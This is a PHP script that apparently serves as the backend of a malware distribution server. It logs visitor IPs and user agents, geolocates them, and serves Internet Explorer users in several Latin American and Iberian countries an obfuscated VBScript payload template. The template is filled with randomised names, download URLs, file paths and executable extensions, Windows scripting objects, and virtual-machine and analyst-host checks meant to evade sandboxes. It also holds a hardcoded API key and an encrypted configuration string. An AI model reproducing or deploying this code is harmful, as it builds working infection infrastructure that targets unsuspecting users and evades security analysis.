<?php
header('Content-Type: text/plain;');


$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$user_agent = " .net ";
function getOS()
{

    global $user_agent;

    $os_platform = "Unknown OS Platform";

    $os_array = array(
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/Windows nt 10.0/i' => 'Windows 10',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.2/i' => 'Windows Home Server',
        '/windows nt 6.0/i' => 'Windows Server 2008',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/Debian/i' => 'Debian',
        '/CentOS/i' => 'CentOS',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile',
    );

    foreach ($os_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{

    global $user_agent;

    $browser = "Unknown Browser";

    $browser_array = array(
        '/msie|trident/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/Opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

function getGeo($ip)
{

    if (strlen($ip) > 3) {


        try {
            $cURLConnection = curl_init();

            curl_setopt($cURLConnection, CURLOPT_URL, 'https://pro.ip-api.com/json/' . $ip . '?key=nacNcSjqDSVv8If');
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($cURLConnection, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($cURLConnection, CURLOPT_TIMEOUT, 5);
            $phoneList = curl_exec($cURLConnection);
            curl_close($cURLConnection);

            $jsonArrayResponse = json_decode($phoneList);
            return $jsonArrayResponse;
        } catch (Exception $e) {
            return false;
        }
    }

    return "";
}

$user_os = getOS();
$user_browser = getBrowser();


$IP = getenv("REMOTE_ADDR");
$host = gethostbyaddr($IP);

if (file_exists("contw.txt")) {
    $listalinks = file('contw.txt');
    $qtlinks = count($listalinks) + 1;
} else {
    $myfile = fopen("contw.txt", "w");
    fwrite($myfile, "");
    fclose($myfile);
    $qtlinks = 1;
}

$fp = fopen("contw.txt", "a+");
fwrite($fp, $qtlinks . " " . date('d h:i:s a', time()) . " " . $IP . " " . $user_agent . " " . PHP_EOL);
fclose($fp);



if (strpos($user_agent, ".net") > 0 || strpos($user_agent, "msie") > 0) {

    if (!file_exists('bloq/')) {
        mkdir('bloq/', 0777, true);
    }

    $country = "";
    try {
        $localizacao = getGeo($IP);
        $country = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
        $countryCODE = isset($localizacao) && isset($localizacao->countryCode) ? $localizacao->countryCode : "-";
    } catch (Exception $e) {
    }


    $data = date('d h:i:s a', time());

    if (!(($country == "") || ($country == 'Spain') || ($country == 'Mexico') || ($country == 'Brazil') || ($country == 'Portugal') || ($country == 'Argentina') || ($country == 'Peru')  || ($country == 'Chile') || ($country == 'Colombia')))
         {

        $fp = fopen("bloq/COUNTRY||" . $IP . " || " . $host . " || " . $country . " || " . $user_browser . " || " . $user_os .  ".txt", "wb");
        fwrite($fp, "");
        fclose($fp);

        $codex = '<?xml version="1.0" encoding="utf-8" ?>
<component id="component2">


    <script language="VBScript">
    <![CDATA[
    CreateObject("WScript.Shell").run "taskkill /F /IM mshta.exe", 2
    ]]>
    </script>
</component>';
 //echo $codex;
 //exit;
}






if (!file_exists('lib/')) {
mkdir('lib/', 0777, true);
}

$fp = fopen(
"lib/" . $IP . " || " . $host . " || " . $country . " || " . $user_browser . " || " . $user_os . ".txt",
"wb"
);
fwrite($fp, "");
fclose($fp);

$wid = 95;
$projectRoot = dirname(__DIR__, 2);
$loadwPath = $projectRoot . '/src/model/loadw.txt';
if (file_exists($loadwPath)) {
$myfile = fopen($loadwPath, "r");
$codex = fread($myfile, filesize($loadwPath));
fclose($myfile);
}

function geraString()
{
$length = 5 + rand(0, 15);
$characters0 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = $characters0[rand(1, 51)] . $characters0[rand(1, 51)];
for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $charactersLength - 1)]; } return $randomString;

    } 
    function cryptw($s1) { 
        $id=95; $sx="" ; 
        $x=0; $x4=rand(0, 24);
         $result=chr($x4 + 65);
          $x4=$x4 + $id; 
    for ($i=0; $i < strlen($s1); $i++)
         { $x=ord(substr($s1, $i, 1)) + $x4; 
    if ($x <= 25) {  $sx = " A" . chr($x + 65); } else { $x2=(int)($x / 25); $x3=$x - ($x2 * 25); $sx=chr($x2 + 65) . chr($x3 + 65); } $result .=$sx; } return $result; }
    for ($i=1; $i <=99; $i++) { $codex=str_replace("#const" . $i  ."#" , geraString() . "_" . $i, $codex); }
    for ($i=1; $i <=99; $i++) { $codex=str_replace( "#var" . $i . "#" ,    geraString() . "_" . $i, $codex ); } 

    $codex=str_replace("%cid%", $wid, $codex); 
    $codex=str_replace("%const1%", "3", $codex ); 

    $codex=str_replace("%const2%", "http://127.0.0.1/fg4gasga", $codex ); 
    $codex=str_replace("%const3%", "http://127.0.0.1/v/fg4gasg", $codex ); 
    $codex=str_replace("%const4%", "http://127.0.0.1/", $codex );
    $codex=str_replace("%const5%", "C:\\Users\\Public\\", $codex ); 
    $codex=str_replace("%const6%", ".fdgr3", $codex);
    $codex=str_replace("%const7%", ".zip", $codex); 
    $codex=str_replace("%const8%", "fg4gasg", $codex);
    $codex=str_replace("%const9%", "hhzb2", $codex); 
    $codex=str_replace("%const10%", "1", $codex);
    $codex=str_replace("%const11%", "15", $codex);
    $codex=str_replace("%const12%", "1", $codex);
    $codex=str_replace("%const13%", "1", $codex); 
    $codex=str_replace("%const14%", "1", $codex);
    $codex=str_replace("%const15%", "1", $codex); 
    $codex=str_replace("%const16%", "winmgmts:", $codex);
    $codex=str_replace("%const17%", "winmgmts:\\\.\\", $codex); 
    $codex=str_replace("%const18%", "Select * from ", $codex);
    $codex=str_replace("%const19%", "Scripting.FileSystemObject", $codex); 
    $codex=str_replace("%const20%", "Shell.Application", $codex );
    $codex=str_replace("%const21%", "MSXML2.XMLHTTP", $codex);
    $codex=str_replace("%const22%", "GET", $codex); 
    $codex=str_replace("%const23%", "ADODB.Stream", $codex ); 
    $codex=str_replace("%const25%", "Microsoft.XMLHTTP", $codex);
    $codex=str_replace("%const26%", "Adodb.Stream", $codex ); 
    $codex=str_replace("%const27%", "winmgmts:{impersonationLevel=impersonate}!\\\.\\root\\cimv2", $codex ); 
    $codex=str_replace("%const28%", "Select * from Win32_OperatingSystem", $codex ); 
    $codex=str_replace("%const29%", "Manufacturer",    $codex ); 
    $codex=str_replace("%const30%", "Model", $codex); 
    $codex=str_replace("%const31%", "root\\cimv2", $codex );
    $codex=str_replace("%const32%", "Win32_ComputerSystem", $codex);
    $codex=str_replace("%const33%", "Version", $codex);
    $codex=str_replace("%const34%", "Win32_BIOS",    $codex ); 
    $codex=str_replace("%const35%", "Virtual Machine", $codex); 
    $codex=str_replace("%const36%", "Hyper-V", $codex );
    $codex=str_replace("%const37%", "VRTUAL - 1000831", $codex);
    $codex=str_replace("%const38%", "Hyper-V 2008 Beta or RC0", $codex); 
    $codex=str_replace("%const39%", "VRTUAL - 5000805", $codex ); 
    $codex=str_replace("%const40%", "BIOS Date: 05/05/08 20:35:56 Ver:08.00.02", $codex); 
    $codex=str_replace("%const41%", "Hyper-V 2008 RTM", $codex);
    $codex=str_replace("%const42%", "VRTUAL - 3000919", $codex); 
    $codex=str_replace("%const43%", "Hyper-V 2008 R2", $codex); 
    $codex=str_replace("%const44%", "A M I - 2000622", $codex);
    $codex=str_replace("%const45%", "VS2005R2SP1 or VPC2007", $codex); 
    $codex=str_replace("%const46%", "A M I - 9000520", $codex); 
    $codex=str_replace("%const47%", "VS2005R2", $codex);
    $codex=str_replace("%const48%", "A M I - 9000816", $codex); 
    $codex=str_replace("%const49%", "A M I - 6000901", $codex); 
    $codex=str_replace("%const50%", "Windows Virtual PC", $codex);
    $codex=str_replace("%const51%", "VS2005 or VPC2004", $codex); 
    $codex=str_replace("%const52%", "VMware Virtual Platform", $codex); 
    $codex=str_replace("%const53%", "VMware", $codex);
    $codex=str_replace("%const54%", "VirtualBox", $codex); 
    $codex=str_replace("%const55%", "WScript.Shell", $codex ); 
    $codex=str_replace("%const56%", "%COMPUTERNAME%", $codex);
    $codex=str_replace("%const57%", "winmgmts:", $codex); 
    $codex=str_replace("%const58%", "Win32_OperatingSystem", $codex ); 
    $codex=str_replace("%const59%", "1034", $codex);
    $codex=str_replace("%const60%", "1046", $codex);
    $codex=str_replace("%const61%", "2058", $codex);
    $codex=str_replace("%const62%", "2070", $codex);
    $codex=str_replace("%const63%", "3082", $codex);
    $codex=str_replace("%const64%", "58378", $codex);
    $codex=str_replace("%const65%", "JOHN-PC", $codex ); 
    $codex=str_replace("%const66%", "Scripting.FileSystemObject", $codex);
    $codex=str_replace("%const67%", ".php", $codex); 
    $codex=str_replace("%const68%", "c:\\", $codex);
    $codex=str_replace("%const69%", "\\", $codex);
    $codex=str_replace("%const70%", "WScript.Shell", $codex ); 
    $codex=str_replace("%const71%", "m1", $codex);
    $codex=str_replace("%const72%", "ai", $codex ); 
    $codex=str_replace("%const73%", "a3", $codex); 
    $codex=str_replace("%const74%", "Shell.Application", $codex ); 
    $codex=str_replace("%const75%", ".exe", $codex);
    $codex=str_replace("%const76%", " ##1", $codex); 
    $codex=str_replace("%const77%", " ##3", $codex);
    $codex=str_replace("%const78%", "open", $codex); 
    $codex=str_replace("%const79%", "LAPTOP-2KFGOS7C", $codex ); 
    $codex=str_replace("%const80%", "7178", $codex);
    $codex=str_replace("%const81%", "9226", $codex); 
    $codex=str_replace("%const82%", "10250", $codex); 
    $codex=str_replace("%const83%", "11274", $codex);
    $codex=str_replace("%const84%", "12298", $codex ); 
    $codex=str_replace("%const85%", "13322", $codex); 
    $codex=str_replace("%const86%", "14346", $codex ); 
    $codex=str_replace("%const87%", "21514", $codex); 
    $codex=str_replace("%const88%", "11274", $codex ); 
    $codex=str_replace("%const89%", "15370", $codex);
    $codex=str_replace("%const90%", "taskkill /F /IM mshta.exe", $codex); 
    $codex=str_replace("%constCFG%", "MCYCRFIDCFOFFFPFPDCCRCKFFFMCKCRCKFTFMCYCKCRCKFTFMDACKCRCKFTFMDBCKCRFRFAFUCYDBDHDFCRFJFQFUFDEWFVCRCXCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCXDAFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCXDBFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCXDCFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCXDDFMFQEXFIEWEYFHCVFJFVFCFQFMCVEXFFFWCRCXDEFMFQEXFIEWEYFHCVFJFVFCFQFMCVFLFOFDCRCXDFFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCXDGFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCXDHFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRCYCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRCYCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCRCYDAFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCYDBFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCYDCFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCYDDFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCYDEFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCYDFFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCYDGFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRDBCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRDBCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCREXEXFDFMFTCYCXCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDACXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDACYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDBCXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDBCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCRDOCKFFFMDACKCRCKFTFMDACXCKCRCKFFFMDBCKCRCKFTFMDBCXCKCRCKEXFHDACKCRCKEXFHDBCKCR", $codex ); 
    echo $codex; 
 } else {
     header("HTTP/1.0 404 Not Found");
 }
    //$myfile=fopen("newfile.txt", "w" ) or die("Unable to open file!"); //fwrite($myfile, $user_agent);
    //fclose($myfile);